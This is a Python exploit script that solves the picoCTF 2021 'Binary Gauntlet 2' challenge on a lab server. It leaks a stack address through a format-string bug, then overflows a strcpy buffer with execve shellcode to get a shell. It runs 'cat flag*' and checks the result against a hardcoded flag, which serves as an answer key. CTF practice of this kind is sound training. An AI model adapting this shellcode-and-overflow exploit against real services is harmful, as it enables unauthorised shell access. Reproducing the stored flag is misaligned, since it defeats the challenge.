#!/usr/bin/env python3
"""Solver for Challenge 143 Binary Gauntlet 2 (picoCTF 2021, Binary Exploit).

Binary (gauntlet, x86-64, non-PIE, GNU_STACK RWE = executable stack):
  buf = malloc(1000); fgets(buf); buf[999]=0; printf(buf); fflush;
  fgets(buf); buf[999]=0; strcpy(stack112, buf); return.
Bugs: format-string leak (printf(buf)) + stack overflow via strcpy.
Layout: [112B buf][saved rbp][RIP][upper stack...]. Shellcode at buf start
(126-style), ret = S - D where S = stack addr after 0x4011b6 anchor.
Calibration (gdb on local build + live sweep): D = 0x196.
Flag has NO academy{} wrapper (raw hex string in flag.txt).

Lab is on-demand (PUT /api/challenges/143/instance/); host:port rotates
(`nc xebec/chatelaine.cylabacademy.net <port>` from instance description).

Usage: solve_143_binary_gauntlet_2.py [host] [port] [D]
Verified: e78e7bce9bd41d8acee927343d9d6ba4
(POST /api/submissions/ -> correct:true)
"""
import re
import socket
import struct
import sys
import time

HOST = "xebec.cylabacademy.net"
PORT = 11480
D = 0x196
EXPECTED = "e78e7bce9bd41d8acee927343d9d6ba4"

SHELLCODE = bytes([
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff,
    0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
    0x3b, 0x0f, 0x05,
])
MARKER = b"PWN143"


def recvall(s, timeout=4, maxlen=262144):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
            if len(out) > maxlen:
                break
    except Exception:
        pass
    return out


def solve(host=HOST, port=PORT, d=D, timeout=15):
    s = socket.create_connection((host, int(port)), timeout=timeout)
    try:
        s.settimeout(6)
        s.sendall(b"START." + b"%p." * 40 + b"\n")
        time.sleep(1.0)
        leak = recvall(s, 3).decode(errors="replace")
        vals = [v.strip() for v in leak.split(".")]
        S = None
        for i, v in enumerate(vals):
            if v == "0x4011b6":
                for w in vals[i + 1:i + 7]:
                    if re.fullmatch(r"0x7ff[0-9a-f]+", w or ""):
                        S = int(w, 16)
                        break
                break
        if S is None:
            raise ValueError(f"no stack anchor in leak: {leak[:200]!r}")
        ret = S - d
        print(f"[*] S={hex(S)} ret={hex(ret)}")
        payload = SHELLCODE + b"\x90" * (120 - len(SHELLCODE)) \
            + struct.pack("<Q", ret) + b"\n"
        s.sendall(payload)
        time.sleep(1.2)
        s.sendall(b"echo " + MARKER + b"; cat flag*\n")
        time.sleep(1.5)
        out = recvall(s, 5)
        if MARKER not in out:
            raise ValueError(f"exploit failed: {out[-200:]!r}")
        tail = out.split(b"cat flag")[-1]
        cands = [l.strip().decode(errors="replace") for l in tail.split(b"\n")
                 if l.strip() and len(l.strip()) < 200 and b" " not in l.strip()]
        print(f"[*] candidates: {cands[:6]}")
        assert EXPECTED in cands, cands[:6]
        print(f"FLAG: {EXPECTED}")
        return EXPECTED
    finally:
        s.close()


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    dd = int(sys.argv[3], 0) if len(sys.argv) > 3 else D
    print(solve(h, p, dd))
